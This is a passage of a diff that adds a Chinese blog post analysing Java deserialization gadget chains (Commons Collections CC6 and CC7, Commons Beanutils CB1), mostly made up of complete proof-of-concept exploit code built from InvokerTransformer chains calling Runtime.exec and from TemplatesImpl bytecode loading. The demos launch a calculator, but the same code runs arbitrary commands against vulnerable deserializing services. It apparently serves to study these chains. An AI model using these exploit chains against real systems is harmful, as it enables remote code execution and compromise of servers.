+        HashMap&lt;Object,Object&gt; hashMap=new HashMap&lt;&gt;();
+        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;1&quot;);
+        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
+        Class c=BadAttributeValueExpException.class;
+        Field valField = c.getDeclaredField(&quot;val&quot;);
+        valField.setAccessible(true);
+        valField.set(badAttributeValueExpException,tiedMapEntry);
+
+        serialize(badAttributeValueExpException);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<h1 id="cc6">CC6</h1>
+<p>主要调用链如下</p>
+<p>HashMap.readObject()-&gt;HashMap.hash()-&gt;TiedMapEntry.hashcode()-&gt;TiedMapEntry.getValue()-&gt;LazyMap.get()</p>
+<p>有两点要注意，第一点是HashMap的put方法也调用了hash，所以我们要通过反射来修改tiedMapEntry的值，我们先放入一个假的Transformer，然后后面通过反射把真的替换上去，第二点是需要<code>lazyMap.remove(&quot;ch1e&quot;);</code>不然没法触发</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173428825.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-java">package cc6;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.HashedMap;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        HashedMap hashedMap = new HashedMap();
+        hashedMap.put(&quot;value&quot;,&quot;ch1e&quot;);
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashedMap, new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;ch1e&quot;);
+        HashMap hashMap1 = new HashMap();
+        hashMap1.put(tiedMapEntry,&quot;boycc1&quot;);
+        lazyMap.remove(&quot;ch1e&quot;);
+
+        Class clazz=LazyMap.class;
+        Field factory = clazz.getDeclaredField(&quot;factory&quot;);
+        factory.setAccessible(true);
+        factory.set(lazyMap,chainedTransformer);
+        serialize(hashMap1);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<h1 id="cc7">CC7</h1>
+<p>CC7比较有意思，可以仔细看看</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172908745.png" alt="img" loading="lazy"><br>
+<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172908745.png" alt="image-20220411172908745" loading="lazy"></p>
+<p>后面的部分其实还是差不多，调用lazymap的get方法，主要是前面的内容，我们可以首先来看一下Hashtable的序列化的过程，就是看他人writeObject方法</p>
+<pre><code class="language-java">private void writeObject(java.io.ObjectOutputStream s)
+        throws IOException {
+    Entry&lt;Object, Object&gt; entryStack = null;
+
+    synchronized (this) {
+        // Write out the length, threshold, loadfactor
+        s.defaultWriteObject();
+
+        // Write out length, count of elements
+        s.writeInt(table.length);
+        s.writeInt(count);
+
+        // Stack copies of the entries in the table
+        for (int index = 0; index &lt; table.length; index++) {
+            Entry&lt;?,?&gt; entry = table[index];
+
+            while (entry != null) {
+                entryStack =
+                    new Entry&lt;&gt;(0, entry.key, entry.value, entryStack);
+                entry = entry.next;
+            }
+        }
+    }
+
+    // Write out the key/value objects from the stacked entries
+    while (entryStack != null) {
+        s.writeObject(entryStack.key);
+        s.writeObject(entryStack.value);
+        entryStack = entryStack.next;
+    }
+}
+</code></pre>
+<p>这里的话他进行序列化，首先写入了table的长度以及table的元素个数，然后取出table中的元素，放入entryStack，这里其实就是栈，然后把栈里面的每个元素用writeObject写入。</p>
+<p>我们再来看一下他的反序列化的流程</p>
+<pre><code class="language-java">private void readObject(java.io.ObjectInputStream s)
+     throws IOException, ClassNotFoundException
+{
+    // Read in the length, threshold, and loadfactor
+    s.defaultReadObject();
+
+    // Read the original length of the array and number of elements
+    int origlength = s.readInt();
+    int elements = s.readInt();
+
+    // Compute new size with a bit of room 5% to grow but
+    // no larger than the original size.  Make the length
+    // odd if it's large enough, this helps distribute the entries.
+    // Guard against the length ending up zero, that's not valid.
+    int length = (int)(elements * loadFactor) + (elements / 20) + 3;
+    if (length &gt; elements &amp;&amp; (length &amp; 1) == 0)
+        length--;
+    if (origlength &gt; 0 &amp;&amp; length &gt; origlength)
+        length = origlength;
+    table = new Entry&lt;?,?&gt;[length];
+    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
+    count = 0;
+
+    // Read the number of elements and then all the key/value objects
+    for (; elements &gt; 0; elements--) {
+        @SuppressWarnings(&quot;unchecked&quot;)
+            K key = (K)s.readObject();
+        @SuppressWarnings(&quot;unchecked&quot;)
+            V value = (V)s.readObject();
+        // synch could be eliminated for performance
+        reconstitutionPut(table, key, value);
+    }
+}
+</code></pre>
+<p>首先先读取了table数组的容量和元素个数，然后根据origlength和elements算出table的长度，后面就根据length创建table数组，反序列化的时候依次读取每个key和value，用reconstitutionPut方法放入table数组，接下来来看reconstitutionPut方法</p>
+<pre><code class="language-java">private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
+    throws StreamCorruptedException
+{
+    if (value == null) {
+        throw new java.io.StreamCorruptedException();
+    }
+    // Makes sure the key is not already in the hashtable.
+    // This should not happen in deserialized version.
+    int hash = key.hashCode();
+    int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {
+        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {
+            throw new java.io.StreamCorruptedException();
+        }
+    }
+    // Creates the new entry.
+    @SuppressWarnings(&quot;unchecked&quot;)
+        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
+    tab[index] = new Entry&lt;&gt;(hash, key, value, e);
+    count++;
+}
+</code></pre>
+<p>首先判断value是否为空，为空抛出异常，然后重写计算了hash和下标，并且判断是否有元素重复，如果不重复的话，会把元素转换成Entry然后放到tab数组里，这里主要是在e.key.equals(key)触发，但是走到这需要两个元素，因为只他要进行比较，一个元素没法进行比较，并且这俩元素的hash也要相同e.key.equals(key)这个函数其实调用了LazyMap的equals，但是LazyMap本身是没有equals这个方法，这个方法来源于他继承的抽象类AbstractMapDecorator</p>
+<pre><code class="language-java">public boolean equals(Object object) {
+    if (object == this) {
+        return true;
+    }
+    return map.equals(object);
+}
+</code></pre>
+<p>首先先判断了一下是否是同一对象，然后去调用map.equals(object)方法，这里的map其实就是LazyMap通过decorate把HashMap传给了他，所以这里其实是调用了HashMap的equals方法，但是HashMap继承了AbstractMap抽象类，这个抽象类中有equals方法</p>
+<pre><code class="language-java">public boolean equals(Object o) {
+    if (o == this)
+        return true;
+
+    if (!(o instanceof Map))
+        return false;
+    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
+    if (m.size() != size())
+        return false;
+
+    try {
+        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+        while (i.hasNext()) {
+            Entry&lt;K,V&gt; e = i.next();
+            K key = e.getKey();
+            V value = e.getValue();
+            if (value == null) {
+                if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
+                    return false;
+            } else {
+                if (!value.equals(m.get(key)))
+                    return false;
+            }
+        }
+    } catch (ClassCastException unused) {
+        return false;
+    } catch (NullPointerException unused) {
+        return false;
+    }
+
+    return true;
+}
+</code></pre>
+<p>他首先在第一个if判断了是否是同一对象，在第二个if判断运行类型是否不是Map，然后强制转换成Map，然后还得判断Map中元素的个数，然后就是使用迭代器遍历每个元素，获取到每个key和value，如果value不是null，会调用m.get(key)，这里m的本质上是LazyMap，所以就成功调用到了LazyMap的get方法啊。</p>
+<p>但是有意思的一点是，在ysoserial中最后调用了lazyMap2.remove(“yy”);这是为什么呢？其实和前面几条链类似，在使用hashtable.put(lazyMap2,2)的时候，lazyMap2会调用AbstractMap抽象类的equals方法，equals内部会调用lazyMap2的get方法判断table中元素key在lazyMap2是否存在，如果不存在会put进去。</p>
+<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172917546.png" alt="image-20220411172917546" loading="lazy"></figure>
+<p>在反序列化的时候AbstractMap抽象类的equals会在第三个if判断中会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞</p>
+<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172951017.png" alt="image-20220411172951017" loading="lazy"></figure>
+<p>除此之外，要触发这条链，还有一个条件就是构造利用链的时候必须添加两个hash一样的元素，下面来分析一下吧。</p>
+<pre><code>public synchronized V put(K key, V value) {
+    // Make sure the value is not null
+    if (value == null) {
+        throw new NullPointerException();
+    }
+
+    // Makes sure the key is not already in the hashtable.
+    Entry&lt;?,?&gt; tab[] = table;
+    int hash = key.hashCode();
+    int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+    @SuppressWarnings(&quot;unchecked&quot;)
+    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];
+    for(; entry != null ; entry = entry.next) {
+        if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) {
+            V old = entry.value;
+            entry.value = value;
+            return old;
+        }
+    }
+
+    addEntry(hash, key, value, index);
+    return null;
+}
+</code></pre>
+<p>他这要满足entry.hash == hash，hash是通过key.hashcode来赋值的，我们传入的key是一个LazyMap，所以得去找LazyMap的hashcode方法，他本身是没有hashcode方法，但是他继承了AbstractMap类，所以会调用AbstractMap类的hashcode方法。</p>
+<pre><code>public int hashCode() {
+    int h = 0;
+    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+    while (i.hasNext())
+        h += i.next().hashCode();
+    return h;
+}
+</code></pre>
+<p>他这里又通过遍历去调用元素的hashcode方法，其实是Node节点的hashCode方法<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411172959162.png" alt="image-20220411172959162" loading="lazy"></p>
+<p>我们跳到HashMap的内部类Node的hashCode方法来看看</p>
+<pre><code>public final int hashCode() {
+    return Objects.hashCode(key) ^ Objects.hashCode(value);
+}
+</code></pre>
+<p>他是先调用Object类的hashCode方法计算出来一个值，然后再用key和value通过Object类的hashCode方法计算出来的值进行异或运算得到一个新的值，继续根据Objects.hashCode</p>
+<figure data-type="image" tabindex="12"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173004870.png" alt="image-20220411173004870" loading="lazy"></figure>
+<p>可以看到，实际上底层调用了字符串“yy”的包装类String的hashCode方法，我们继续跟进到String的hashCode方法，可以看到，第一次算的时候是val[i]是y，ascii是121，h就是121，第二次是y，就是121*31+121也就是3872</p>
+<pre><code class="language-java">public int hashCode() {
+    int h = hash;
+    if (h == 0 &amp;&amp; value.length &gt; 0) {
+        char val[] = value;
+
+        for (int i = 0; i &lt; value.length; i++) {
+            h = 31 * h + val[i];
+        }
+        hash = h;
+    }
+    return h;
+}
+</code></pre>
+<p>然后回到Node类中的hashCode方法，进行异或运算得到一个3873新的hash值并返回到AbstractMap类的hashCode方法中，最终lazyMap1的hash值就是3873</p>
+<p>lazyMap2也是同理，这里的话yy和zZ都是精心构造的，也可以换成Ea和FB</p>
+<p>POC如下：</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class cc7test {
+    public static void main(String[] args) throws Exception {
+        Transformer transformerChain = new ChainedTransformer(new Transformer[0]);
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new String[]{&quot;calc&quot;}),
+        };
+        Map hashMap1 = new HashMap();
+        Map hashMap2 = new HashMap();
+        Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);
+        lazyMap1.put(&quot;yy&quot;, 1);
+        Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);
+        lazyMap2.put(&quot;zZ&quot;, 1);
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 1);
+        lazyMap2.remove(&quot;yy&quot;);
+        Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(transformerChain, transformers);
+        serialize(hashtable);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<h1 id="cb1">CB1</h1>
+<p>Apache Commons Beanutils 是Apache Commons工具集下的一个项目，提供了一些对普通Java类对象的一些操作方法，这些Java类对象也叫JavaBean</p>
+<p>这里直接来写一个demo</p>
+<pre><code class="language-java">public class Person {
+    private String name;
+    private int age;
+
+    public String getName() { return this.name; }
+    public void setName(String name) { this.name = name; }
+
+    public int getAge() { return this.age; }
+    public void setAge(int age) { this.age = age; }
+}
+</code></pre>
+<p>这样的class称为bean，读写方法以get和set开头，后面是首字母大写的属性名，他们包含若干个私有的属性，要得到这个属性只能通过getXxxx来获取。</p>
+<p>除此之外，commons beanutils 中有这么一个类PropertyUtils，他提供了一个静态方法getProperty(),该方法可以让使用者直接调用某个JavaBean的某个属性的getter，比如上面那个，我要调用他的getName，我们只需要这么写即可</p>
+<pre><code class="language-java">PropertyUtils.getProperty(new Person(),&quot;name&quot;);
+</code></pre>
+<p>这时候他就会去自动寻找到Person类的name属性的getter，就是上面的getName(),调用并且获取返回值，此外，他还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，可以通过如下方式进行递归获取</p>
+<pre><code class="language-java">PropertyUtils.getProperty(a,&quot;b.c&quot;);
+</code></pre>
+<p>通过这种方式可以很方便的获取不同类的不同属性的值</p>
+<p>这条CB链和CC4有点关系，CC4中有调用过comparator的compare方法，CB1就是在这发生了改变，他使用到了一个类，<code>org.apache.commons.beanutils.BeanComparator</code>他的compare方法如下</p>
+<pre><code class="language-java">public int compare( Object o1, Object o2 ) {
+    
+    if ( property == null ) {
+        // compare the actual objects
+        return comparator.compare( o1, o2 );
+    }
+    
+    try {
+        Object value1 = PropertyUtils.getProperty( o1, property );
+        Object value2 = PropertyUtils.getProperty( o2, property );
+        return comparator.compare( value1, value2 );
+    }
+    catch ( IllegalAccessException iae ) {
+        throw new RuntimeException( &quot;IllegalAccessException: &quot; + iae.toString() );
+    } 
+    catch ( InvocationTargetException ite ) {
+        throw new RuntimeException( &quot;InvocationTargetException: &quot; + ite.toString() );
+    }
+    catch ( NoSuchMethodException nsme ) {
+        throw new RuntimeException( &quot;NoSuchMethodException: &quot; + nsme.toString() );
+    } 
+}
+</code></pre>
+<p>如果this.property为空的情况下，直接比较这俩对象。如果property不为空，则是调用PropertyUtils.getProperty来获取这两个对象的property属性的值</p>
+<pre><code class="language-java">public static Object getProperty(Object bean, String name)
+        throws IllegalAccessException, InvocationTargetException,
+        NoSuchMethodException {
+
+    return (PropertyUtilsBean.getInstance().getProperty(bean, name));
+
+}
+</code></pre>
+<p>返回指定bean的指定属性的值，不进行类型转换，比如我传入bean是之前的那个demm中的person，name是上面的age，他会去返回我们的age，也就是这个方法会自动去调用一个JavaBean的getter方法。</p>
+<p>CC3链中有这么一个方法TemplatesImpl.getOutputProperties()，他符合getXxxx这样的格式，我们通过使用PropertyUtils.getProperty(TemplatesImpl,”outputProperties”)这样来调用我们的TemplatesImpl.getOutputProperties</p>
+<p>demo</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class cb1 {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates=new TemplatesImpl();
+        Class tc=templates.getClass();
+        Field nameField = templates.getClass().getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        byte[] code= Files.readAllBytes(Paths.get(&quot;D://class/demo.class&quot;));
+        byte[][] codes= {code};
+        bytecodesField.set(templates,codes);
+        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        final BeanComparator comparator = new BeanComparator();
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        queue.add(1);
+        queue.add(2);
+        Field propertyField=comparator.getClass().getDeclaredField(&quot;property&quot;);
+        propertyField.setAccessible(true);
+        propertyField.set(comparator,&quot;outputProperties&quot;);
+        Field queueField=queue.getClass().getDeclaredField(&quot;queue&quot;);
+        queueField.setAccessible(true);
+        queueField.set(queue,new Object[]{templates, templates});
+        serialize(queue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>由于这个需要用到CC包，下面给出一个无依赖的链</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xerces.internal.impl.xpath.regex.CaseInsensitiveMap;
+import org.apache.commons.beanutils.BeanComparator;
+import sun.misc.ASCIICaseInsensitiveComparator;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class cb1 {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates=new TemplatesImpl();
+        Class tc=templates.getClass();
+        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        byte[] code= Files.readAllBytes(Paths.get(&quot;D://class/demo.class&quot;));
+        byte[][] codes= {code};
+        bytecodesField.set(templates,codes);
+        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        final BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;2&quot;);
+        Field propertyField=comparator.getClass().getDeclaredField(&quot;property&quot;);
+        propertyField.setAccessible(true);
+        propertyField.set(comparator,&quot;outputProperties&quot;);
+        Field queueField=queue.getClass().getDeclaredField(&quot;queue&quot;);
+        queueField.setAccessible(true);
+        queueField.set(queue,new Object[]{templates, templates});
+        serialize(queue);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>具体参考https://ch1e.cn/2022/03/06/cb1/</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#cc1">CC1</a>
+<ul>
+<li><a href="#transformedmap">TransformedMap</a></li>
+<li><a href="#lazymap">LazyMap</a></li>
+</ul>
+</li>
+<li><a href="#cc2">CC2</a></li>
+<li><a href="#cc3">CC3</a></li>
+<li><a href="#cc4">CC4</a></li>
+<li><a href="#cc5">CC5</a></li>
+<li><a href="#cc6">CC6</a></li>
+<li><a href="#cc7">CC7</a></li>
+<li><a href="#cb1">CB1</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/chong-sheng-zhi-xue-xi-thinkphp51x-fan-xu-lie-hua/">
+              <h3 class="post-title">
+                重生之学习thinkphp5.1.x反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
